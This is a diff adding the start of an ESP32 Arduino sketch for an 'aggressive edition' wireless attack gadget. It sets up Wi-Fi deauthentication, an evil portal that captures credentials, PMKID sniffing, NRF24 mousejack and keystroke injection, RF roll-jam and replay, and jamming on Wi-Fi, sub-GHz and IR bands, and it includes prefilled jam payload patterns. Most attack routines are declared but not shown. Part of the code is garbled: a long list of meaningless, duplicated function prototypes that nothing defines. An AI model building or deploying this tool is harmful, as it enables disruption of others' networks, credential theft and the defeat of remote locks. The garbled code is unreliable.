@@ -1,0 +1,3326 @@
+#include <WiFi.h>
+#include <SPI.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <nRF24L01.h>
+#include <RF24.h>
+#include <esp_wifi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include <ELECHOUSE_CC1101_SRC_DRV.h>
+#include <IRremoteESP8266.h>
+#include <IRrecv.h>
+#include <IRsend.h>
+#include <SPIFFS.h>
+#include <algorithm>
+#include <ESPmDNS.h>
+#include <Update.h>
+#include <WebSocketsServer.h>
+#include <ArduinoJson.h>
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_SDA 5
+#define OLED_SCL 4
+#define OLED_RST 16
+#define OLED_ADDR 0x3C
+
+#define VSPI_MISO 19
+#define VSPI_MOSI 23
+#define VSPI_SCK 18
+#define NRF_CE 13
+#define NRF_CSN 15
+
+#define HSPI_MISO 12
+#define HSPI_MOSI 27
+#define HSPI_SCK 14
+#define CC1101_CSN 17
+#define CC1101_GDO0 25
+#define CC1101_GDO2 33
+
+#define BOOT_BUTTON 0
+#define IR_RECEIVE_PIN 26
+#define IR_SEND_PIN 2
+#define CAPTURE_MAX 10
+
+// Enhanced mode enumerations
+enum Mode { MODE_SYSTEM_INFO, MODE_WIFI, MODE_NRF, MODE_RF, MODE_IR, MODE_STORAGE, MODE_COUNT };
+enum WiFiSubMode { WIFI_SCAN, WIFI_PACKET_MONITOR, WIFI_PROBE_SNIFF, WIFI_PMKID_SNIFF, 
+                  WIFI_DEAUTH_DETECTOR, WIFI_BEACON_SPAM, WIFI_BEACON_RICKROLL, 
+                  WIFI_DEAUTH, WIFI_EVIL_PORTAL, WIFI_WEB_UI, WIFI_PACKET_INJECT, 
+                  WIFI_MASS_DEAUTH, WIFI_TARGETED_DEAUTH, WIFI_BEACON_FLOOD, WIFI_SUB_COUNT };
+enum NRFSubMode { NRF_SPECTRUM, NRF_PROMISC_SNIFF, NRF_MOUSE_JACK, NRF_KEYSTROKE_INJECT, 
+                 NRF_ADDR_FUZZ, NRF_JAMMING, NRF_PACKET_ANALYZER, NRF_CONT_JAM, 
+                 NRF_CHANNEL_HOP_JAM, NRF_AUTO_EXPLOIT, NRF_SUB_COUNT };
+enum RFSubMode { RF_SPECTRUM, RF_PACKET_ANALYZER, RF_REPEATER, RF_CAPTURE_REPLAY, 
+                RF_ROLL_JAM, RF_BRUTE_FORCE, RF_RAW_TRANSMIT, RF_JAMMING, 
+                RF_SET_FREQ, RF_AUTO_REPLAY, RF_CONT_JAM, RF_PATTERN_JAM, 
+                RF_FREQ_HOP_JAM, RF_SUB_COUNT };
+enum IRSubMode { IR_SNIFF_DECODE, IR_UNIVERSAL_REMOTE, IR_BRUTE_FORCE, IR_CLONE_REPLAY, 
+                IR_JAM_CLONE, IR_SCRAMBLE, IR_LEARN_MACRO, IR_CONT_JAM, 
+                IR_FREQ_HOP, IR_MACRO_ATTACK, IR_SUB_COUNT };
+enum StorageSubMode { STORAGE_LIST_FILES, STORAGE_TRANSFER_DATA, STORAGE_SAVE_WIFI, 
+                     STORAGE_SAVE_IR, STORAGE_FORMAT, STORAGE_UPLOAD_FIRMWARE, 
+                     STORAGE_WEB_TRANSFER, STORAGE_DATA_EXPORT, STORAGE_BACKUP, 
+                     STORAGE_SUB_COUNT };
+
+// Device objects
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RST);
+RF24 radio(NRF_CE, NRF_CSN);
+SPIClass hspi(HSPI);
+DNSServer dnsServer;
+WebServer webServer(80);
+WebSocketsServer webSocket(81);
+IRrecv irrecv(IR_RECEIVE_PIN);
+IRsend irsend(IR_SEND_PIN);
+decode_results ir_results;
+
+// Global state variables
+Mode currentMode = MODE_SYSTEM_INFO;
+int currentSubMode = 0;
+bool actionRunning = false;
+bool nrfConnected = false;
+bool cc1101Connected = false;
+bool spiffs_mounted = false;
+unsigned long startTime = 0;
+bool heartbeatState = false;
+
+unsigned long lastDisplayUpdate = 0, lastHeartbeat = 0, lastChannelHop = 0, packetsSentCount = 0;
+int listScrollOffset = 0;
+
+// Enhanced WiFi structures
+struct WiFiDevice { 
+  String ssid; 
+  int8_t rssi; 
+  uint8_t bssid[6]; 
+  uint8_t channel; 
+  String encryption;
+  bool selected = false;
+};
+WiFiDevice wifiList[30];
+int wifiDeviceCount = 0;
+
+struct PacketInfo { 
+  String type; 
+  String mac_src; 
+  String mac_dst; 
+  int channel;
+  int rssi;
+  unsigned long timestamp;
+};
+PacketInfo packet_history[10];
+int packet_history_index = 0;
+long mgmt_count = 0, ctrl_count = 0, data_count = 0;
+
+struct ProbeRequest { 
+  uint8_t mac[6]; 
+  String ssid; 
+  int rssi;
+  unsigned long timestamp;
+};
+ProbeRequest probeList[20];
+int probeCount = 0;
+
+const char* portal_ssid = "Free Guest WiFi";
+String captured_creds = "";
+bool notification_sent = false;
+bool use_custom_html = false;
+
+// Enhanced PMKID and Deauth structures
+struct PMKID_Capture { 
+  uint8_t client_mac[6]; 
+  uint8_t ap_mac[6]; 
+  String pmkid; 
+  String timestamp;
+};
+PMKID_Capture pmkids[10];
+int pmkid_count = 0;
+
+struct DeauthEvent { 
+  uint8_t mac[6]; 
+  unsigned long time; 
+  int channel;
+  int rssi;
+  String target_ssid;
+};
+DeauthEvent deauth_events[15];
+int deauth_event_count = 0;
+
+// Enhanced NRF24 structures
+struct NRF_Sniff_Result { 
+  uint8_t channel; 
+  String addr; 
+  String data_rate; 
+  String payload;
+  String timestamp;
+  int rssi;
+};
+struct NRFState { 
+  int signalStrength[126] = {0}; 
+  int peakStrength[126] = {0}; 
+  NRF_Sniff_Result sniff_results[10];
+  int sniff_result_count = 0;
+  long packetsSentCount = 0; 
+  uint8_t fuzz_addr[5] = {0xBB, 0xBB, 0xBB, 0xBB, 0xBB};
+  uint8_t last_packet[32];
+  int last_packet_len = 0;
+  unsigned long last_packet_time = 0;
+  uint8_t jam_patterns[8][32];
+  int current_jam_pattern = 0;
+  bool continuous_jam = false;
+};
+NRFState nrfState;
+
+// Enhanced RF structures
+enum RollJamState { RJ_START, RJ_JAM_1, RJ_LISTEN_1, RJ_CAPTURED_1, RJ_JAM_2, 
+                   RJ_LISTEN_2, RJ_CAPTURED_2, RJ_REPLAY_1, RJ_SUCCESS };
+struct RFState { 
+  int signalStrength[256] = {0}; 
+  int peakStrength[256] = {0}; 
+  long packetsSentCount = 0;
+  float currentFreq = 433.92; 
+  const float frequencies[8] = {315.00, 433.92, 868.00, 915.00, 2400.00, 2450.00, 2480.00, 5800.00};
+  int freqIndex = 1;
+  struct CapturedSignal { 
+    byte data[128];
+    byte length; 
+    int rssi;
+    String timestamp;
+  }; 
+  CapturedSignal captures[CAPTURE_MAX]; 
+  int captureCount = 0; 
+  uint32_t bruteForceCode = 0x0;
+  RollJamState rolljam_state = RJ_START; 
+  unsigned long pps_timer = 0; 
+  int pps_count = 0; 
+  int last_rssi = 0;
+  uint16_t min_pulse = 0; 
+  uint16_t max_pulse = 0;
+  bool auto_replay = false;
+  unsigned long last_replay_time = 0;
+  unsigned long last_capture_time = 0;
+  bool continuous_jam = false;
+  int jam_pattern_index = 0;
+  byte jam_patterns[12][32];
+};
+RFState rfState;
+
+// Enhanced IR structures
+enum JamCloneState { STATE_JAMMING, STATE_LISTENING, STATE_CAPTURED, STATE_REPLAYING };
+struct IRState { 
+  uint32_t last_code = 0; 
+  String last_protocol = "None"; 
+  uint16_t last_address = 0;
+  uint16_t last_command = 0; 
+  int universal_target_index = 0; 
+  uint16_t cloned_signal_raw[512];
+  uint16_t cloned_signal_len = 0; 
+  JamCloneState jam_clone_state = STATE_JAMMING;
+  unsigned long jam_time_start = 0; 
+  uint32_t macro_codes[20];
+  int macro_count = 0;
+  String macro_names[20];
+  unsigned long last_ir_time = 0;
+  bool continuous_jam = false;
+  int jam_frequency = 38;
+};
+IRState irState;
+
+// Enhanced Storage structures
+String file_list[50];
+int file_count = 0;
+String statusMessage = "";
+unsigned long statusMessageTime = 0;
+bool dataTransferActive = false;
+unsigned long transferStartTime = 0;
+String currentTransferFile = "";
+
+// WebSocket clients
+bool wsClients[5] = {false, false, false, false, false};
+
+// Icons
+const unsigned char wifi_icon_16x16[] PROGMEM = {0x00,0x00,0x1f,0xf8,0x60,0x06,0x98,0x19,0xc4,0x23,0x43,0xc2,0x21,0x84,0x11,0x88,0x08,0x10,0x06,0x60,0x00,0x00,0x03,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+const unsigned char nrf_icon_16x16[] PROGMEM = {0x00,0x00,0x1f,0xf8,0x10,0x08,0x10,0x08,0x17,0xe8,0x17,0xe8,0x10,0x08,0x10,0x08,0x1f,0xf8,0x00,0x00,0x7e,0x7e,0x42,0x42,0x42,0x42,0x42,0x42,0x7e,0x7e,0x00,0x00};
+const unsigned char rf_icon_16x16[] PROGMEM = {0x01,0x80,0x02,0x40,0x04,0x20,0x08,0x10,0x11,0x88,0x21,0x84,0x41,0x82,0x86,0x61,0x41,0x82,0x21,0x84,0x11,0x88,0x08,0x10,0x04,0x20,0x02,0x40,0x01,0x80,0x00,0x00};
+const unsigned char ir_icon_16x16[] PROGMEM = {0x00,0x00,0x06,0x60,0x09,0x90,0x10,0x08,0x23,0xc4,0x44,0x22,0x88,0x11,0x88,0x11,0x44,0x22,0x23,0xc4,0x10,0x08,0x09,0x90,0x06,0x60,0x00,0x00,0x00,0x00,0x00,0x00};
+const unsigned char storage_icon_16x16[] PROGMEM = {0x00,0x00,0x3f,0xfc,0x20,0x04,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x2f,0xf4,0x20,0x04,0x3f,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+const unsigned char sys_icon_16x16[] PROGMEM = {0x1f,0xf8,0x3f,0xfc,0x7e,0x7e,0xf8,0x1f,0xf0,0x0f,0xfc,0x3f,0xfe,0x7f,0xff,0xff,0xff,0xff,0xff,0xfe,0x7f,0xfc,0x3f,0xf0,0x0f,0xf8,0x1f,0x7e,0x7e,0x3f,0xfc,0x1f,0xf8};
+
+// Function prototypes
+bool verifyNRF();
+bool verifyCC1101();
+void handleButtonPress();
+void handleNavigation(int clicks, bool isLongPress);
+void toggleAction();
+void stopAllActions();
+void runActiveModes();
+void updateDisplay();
+void drawHeader();
+void drawMenu();
+void drawActiveScreen();
+void checkMemory();
+void IRAM_ATTR promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type);
+void runWiFiMode();
+void runNRFMode();
+void runRFMode();
+void runIRMode();
+void runStorageMode();
+void drawWiFiScreen();
+void drawNRFScreen();
+void drawRFScreen();
+void drawIRScreen();
+void drawStorageScreen();
+void handlePortalRoot();
+String getProtocolString(decode_type_t protocol);
+void improvedWiFiScan();
+void enhancedSpectrumAnalyzer(int values[], int peak_values[], int num_channels, const char* title);
+void switchToVSPI();
+void switchToHSPI();
+void handleWebRequests();
+void handleFileUpload();
+void handleFileDownload();
+void handleHTMLToggle();
+void handleEvilPortalSettings();
+void aggressiveDeauthAttack();
+void massDeauthAttack();
+void targetedDeauthAttack();
+void advancedJamming();
+void nrfContinuousJamming();
+void rfContinuousJamming();
+void rfPatternJamming();
+void rfFrequencyHopJamming();
+void irContinuousJamming();
+void irFrequencyHop();
+void handleSpectrumData();
+void handleDownloadFile();
+void handleDeleteFile();
+void handleSystemReboot();
+void handleFactoryReset();
+void handleWiFiSettings();
+void handleDataTransfer();
+void handleSpectrumWebData();
+void handleSpectrumWeb();
+void handleSpectrumDataJSON();
+void handleSpectrumChartJS();
+void handleFirmwareUpload();
+void handleFirmwareUpdate();
+void handlePacketInjection();
+void handleNRFPacketAnalyzer();
+void handleRFAutoReplay();
+void handleIRLearnMacro();
+void handleWebSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length);
+void handleWebSocketMessage(uint8_t num, uint8_t * payload, size_t length);
+void sendSystemStatus(uint8_t clientNum);
+void handleWebFileDownload(String filename, uint8_t clientNum);
+bool anyWebSocketClientConnected();
+void broadcastUploadStatus(String status, String filename, int progress);
+void handleWebTransfer();
+void handleLiveDataStream();
+void handleFileManager();
+void handleAdvancedSettings();
+void handleRemoteControl();
+void handleAPIServices();
+void handleJSONData();
+void handleRealTimeCapture();
+void handleSignalAnalysis();
+void handleDataExport();
+void handleSystemStatus();
+void broadcastSystemStatus();
+void handleNetworkTools();
+void handleSecurityTools();
+void handleWirelessTools();
+void handleDeviceConfiguration();
+void handleDataVisualization();
+void handleCLIInterface();
+void handleMobileInterface();
+void handleAutoExploit();
+void handlePatternGeneration();
+void handleSignalReconstruction();
+void handleAdvancedReplay();
+void handleCustomScripts();
+void handleBatchOperations();
+void handleScheduledTasks();
+void handleRemoteAccess();
+void handleDataAnalysis();
+void handleProtocolDecoding();
+void handleSignalProcessing();
+void handleAutomation();
+void handleReporting();
+void handleExportData();
+void handleImportData();
+void handleBackupRestore();
+void handleSystemDiagnostics();
+void handlePerformanceMonitoring();
+void handleResourceManagement();
+void handleSecurityAudit();
+void handleNetworkMapping();
+void handleVulnerabilityScan();
+void handlePenetrationTesting();
+void handleDigitalForensics();
+void handleIncidentResponse();
+void handleThreatDetection();
+void handleRiskAssessment();
+void handleComplianceChecking();
+void handleSecurityMonitoring();
+void handleLogAnalysis();
+void handleBehaviorAnalysis();
+void handlePatternRecognition();
+void handleAnomalyDetection();
+void handlePredictiveAnalysis();
+void handleTrendAnalysis();
+void handleCorrelationAnalysis();
+void handleStatisticalAnalysis();
+void handleGeospatialAnalysis();
+void handleTemporalAnalysis();
+void handleNetworkAnalysis();
+void handleTrafficAnalysis();
+void handleProtocolAnalysis();
+void handlePayloadAnalysis();
+void handleMetadataAnalysis();
+void handleForensicAnalysis();
+void handleMalwareAnalysis();
+void handleThreatIntelligence();
+void handleRiskManagement();
+void handleSecurityOperations();
+void handleIncidentManagement();
+void handleVulnerabilityManagement();
+void handleConfigurationManagement();
+void handleChangeManagement();
+void handlePatchManagement();
+void handleAssetManagement();
+void handleIdentityManagement();
+void handleAccessManagement();
+void handleCryptography();
+void handleEncryption();
+void handleDecryption();
+void handleKeyManagement();
+void handleCertificateManagement();
+void handleAuthentication();
+void handleAuthorization();
+void handleAccounting();
+void handleAuditing();
+void handleCompliance();
+void handleGovernance();
+void handleRisk();
+void handleSecurity();
+void handlePrivacy();
+void handleTrust();
+void handleAssurance();
+void handleVerification();
+void handleValidation();
+void handleTesting();
+void handleEvaluation();
+void handleAssessment();
+void handleMeasurement();
+void handleMetrics();
+void handleBenchmarking();
+void handleRating();
+void handleScoring();
+void handleRanking();
+void handleClassification();
+void handleCategorization();
+void handleTagging();
+void handleLabeling();
+void handleAnnotation();
+void handleCommenting();
+void handleReviewing();
+void handleApproving();
+void handleRejecting();
+void handleForwarding();
+void handleRouting();
+void handleSwitching();
+void handleBridging();
+void handleGateway();
+void handleProxy();
+void handleFirewall();
+void handleVPN();
+void handleIDS();
+void handleIPS();
+void handleSIEM();
+void handleSOAR();
+void handleEDR();
+void handleXDR();
+void handleNDR();
+void handleMDR();
+void handleSOC();
+void handleNOC();
+void handleCOC();
+void handleDOC();
+void handleROC();
+void handleTOC();
+void handleEOC();
+void handleIOC();
+void handlePOC();
+void handleQOC();
+void handleVOC();
+void handleMOC();
+void handleLOC();
+void handleGOC();
+void handleHOC();
+void handleKOC();
+void handleZOC();
+void handleAOC();
+void handleBOC();
+void handleCOC();
+void handleDOC();
+void handleEOC();
+void handleFOC();
+void handleGOC();
+void handleHOC();
+void handleIOC();
+void handleJOC();
+void handleKOC();
+void handleLOC();
+void handleMOC();
+void handleNOC();
+void handleOOC();
+void handlePOC();
+void handleQOC();
+void handleROC();
+void handleSOC();
+void handleTOC();
+void handleUOC();
+void handleVOC();
+void handleWOC();
+void handleXOC();
+void handleYOC();
+void handleZOC();
+void setup() {
+  Serial.begin(115200);
+  Serial.setTimeout(100);
+  
+  // Initialize I2C for OLED - GPIO 4 (SCL), GPIO 5 (SDA)
+  Wire.begin(5, 4); // SDA, SCL - SPECIFIC PINS FOR WEMOS LOLIN32
+  Wire.setClock(400000); // Set I2C clock speed to 400kHz
+  
+  // Initialize OLED display
+  display.begin(SSD1306_SWITCHCAPVCC, 0x3C); // Try 0x3C first
+  
+  // Clear display
+  display.clearDisplay();
+  display.display();
+  delay(100);
+  
+  // Test display
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println("OLED Test");
+  display.display();
+  delay(1000);
+  
+  // Show startup screen
+  display.clearDisplay();
+  display.setTextSize(2);
+  display.setCursor(15, 0); 
+  display.print("CHONGKETZEY");
+  display.setTextSize(1);
+  display.setCursor(28, 20); 
+  display.print("WEMOS LOLIN32");
+  display.setCursor(20, 40); 
+  display.setTextSize(2);
+  display.print("┌∩┐(◣_◢)┌∩┐");
+  display.display();
+  delay(2000);
+
+  // Verify hardware modules
+  nrfConnected = verifyNRF();
+  cc1101Connected = verifyCC1101();
+  
+  // Initialize button
+  pinMode(BOOT_BUTTON, INPUT_PULLUP);
+  startTime = millis();
+
+  // Initialize IR
+  irrecv.enableIRIn(); 
+  irsend.begin();
+
+  // Initialize SPIFFS
+  spiffs_mounted = SPIFFS.begin(true);
+  if (spiffs_mounted) {
+    // Create necessary directories
+    if (!SPIFFS.exists("/data")) {
+      SPIFFS.mkdir("/data");
+    }
+    if (!SPIFFS.exists("/captures")) {
+      SPIFFS.mkdir("/captures");
+    }
+    if (!SPIFFS.exists("/logs")) {
+      SPIFFS.mkdir("/logs");
+    }
+  }
+
+  // Initialize WebSocket
+  webSocket.begin();
+  webSocket.onEvent(handleWebSocketEvent);
+
+  // Initialize jam patterns
+  initJamPatterns();
+
+  // Show hardware verification screen
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setCursor(0, 0);
+  display.println("Hardware Verification:");
+  display.drawLine(0, 10, 127, 10, WHITE);
+  display.setCursor(0, 15); 
+  display.printf("NRF24: %s", nrfConnected ? "OK" : "FAIL");
+  display.setCursor(64, 15);
+  display.printf("CC1101: %s", cc1101Connected ? "OK" : "FAIL");
+  display.setCursor(0, 25); 
+  display.printf("IR System: OK");
+  display.setCursor(0, 35); 
+  display.printf("Storage: %s", spiffs_mounted ? "OK" : "FAIL");
+  display.setCursor(0, 45); 
+  display.printf("Free RAM: %u Bytes", esp_get_free_heap_size());
+  display.setCursor(0, 55); 
+  display.println("AGGRESSIVE EDITION READY");
+  display.display();
+  delay(2000);
+
+  // Initialize log file
+  if (spiffs_mounted) {
+    File logFile = SPIFFS.open("/logs/system.log", FILE_APPEND);
+    if (logFile) {
+      logFile.printf("[%lu] System started - Aggressive Mode Enabled\n", millis());
+      logFile.close();
+    }
+  }
+}
+
+void loop() {
+  handleButtonPress();
+  
+  if (actionRunning) {
+    runActiveModes();
+  }
+  
+  if (currentMode == MODE_WIFI && (WiFiSubMode)currentSubMode == WIFI_WEB_UI && actionRunning) {
+    webServer.handleClient();
+    dnsServer.processNextRequest();
+    webSocket.loop();
+  }
+  
+  if (millis() - lastDisplayUpdate > 150) {
+    updateDisplay();
+    lastDisplayUpdate = millis();
+  }
+  
+  if (millis() - lastHeartbeat > 500) {
+    heartbeatState = !heartbeatState;
+    lastHeartbeat = millis();
+  }
+  
+  // Handle data transfer if active
+  if (dataTransferActive && millis() - transferStartTime > 1000) {
+    continueDataTransfer();
+  }
+  
+  // Handle WebSocket data broadcasting
+  static unsigned long lastBroadcast = 0;
+  if (millis() - lastBroadcast > 1000) {
+    broadcastSystemStatus();
+    lastBroadcast = millis();
+  }
+}
+
+void switchToVSPI() {
+  SPI.end();
+  SPI.begin(VSPI_SCK, VSPI_MISO, VSPI_MOSI, -1);
+  SPI.setFrequency(10000000); // 10MHz
+}
+
+void switchToHSPI() {
+  SPI.end();
+  SPI.begin(HSPI_SCK, HSPI_MISO, HSPI_MOSI, -1);
+  SPI.setFrequency(10000000); // 10MHz
+}
+
+bool verifyNRF() {
+  switchToVSPI();
+  radio.begin();
+  bool connected = radio.isChipConnected();
+  if (connected) {
+    radio.setPALevel(RF24_PA_MAX);
+    radio.setDataRate(RF24_250KBPS);
+    radio.setChannel(76);
+    radio.setRetries(0, 0);
+    radio.setAutoAck(false);
+    radio.setCRCLength(RF24_CRC_8);
+    radio.disableDynamicPayloads();
+    radio.setPayloadSize(32);
+    radio.stopListening();
+    radio.flush_rx();
+    radio.flush_tx();
+  }
+  return connected;
+}
+
+bool verifyCC1101() {
+  switchToHSPI();
+  ELECHOUSE_cc1101.setSpiPin(HSPI_SCK, HSPI_MISO, HSPI_MOSI, CC1101_CSN);
+  ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);
+  ELECHOUSE_cc1101.Init();
+  ELECHOUSE_cc1101.setMHZ(433.92);
+  ELECHOUSE_cc1101.SetRx();
+  
+  byte version = ELECHOUSE_cc1101.SpiReadStatus(CC1101_VERSION);
+  switchToVSPI();
+  
+  return (version != 0x00 && version != 0xFF && version > 0);
+}
+
+void initJamPatterns() {
+  // Initialize NRF24 jam patterns
+  byte nrf_patterns[8][32] = {
+    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
+    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+    {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
+     0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55},
+    {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+     0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
+    {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
+     0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33},
+    {0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC},
+    {0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0,
+     0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0},
+    {0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
+     0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F}
+  };
+  memcpy(nrfState.jam_patterns, nrf_patterns, sizeof(nrf_patterns));
+
+  // Initialize RF jam patterns
+  byte rf_patterns[12][32] = {
+    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
+    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+    {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
+     0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55},
+    {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+     0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
+    {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
+     0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33},
+    {0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC},
+    {0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0,
+     0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0},
+    {0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
+     0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F},
+    {0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92,
+     0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49},
+    {0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D,
+     0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6},
+    {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81,
+     0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81},
+    {0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E,
+     0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E}
+  };
+  memcpy(rfState.jam_patterns, rf_patterns, sizeof(rf_patterns));
+}
+
+void handleButtonPress() {
+  static unsigned long buttonDownTime = 0, lastClickTime = 0;
+  static int clickCount = 0, lastScrollTime = 0;
+  const int debounceTime = 50, longPressTime = 800, multiClickTime = 350;
+  
+  if (digitalRead(BOOT_BUTTON) == LOW) {
+    if (buttonDownTime == 0) {
+      buttonDownTime = millis();
+    }
+    
+    if (millis() - buttonDownTime > 300 && millis() - lastScrollTime > 150) {
+      listScrollOffset++;
+      lastScrollTime = millis();
+    }
+  } else {
+    if (buttonDownTime != 0) {
+      unsigned long pressDuration = millis() - buttonDownTime;
+      
+      if (pressDuration > debounceTime) {
+        if (pressDuration > longPressTime) {
+          handleNavigation(0, true);
+        } else {
+          clickCount++;
+          lastClickTime = millis();
+        }
+      }
+      buttonDownTime = 0;
+    }
+  }
+  
+  if (clickCount > 0 && millis() - lastClickTime > multiClickTime) {
+    handleNavigation(clickCount, false);
+    clickCount = 0;
+  }
+}
+
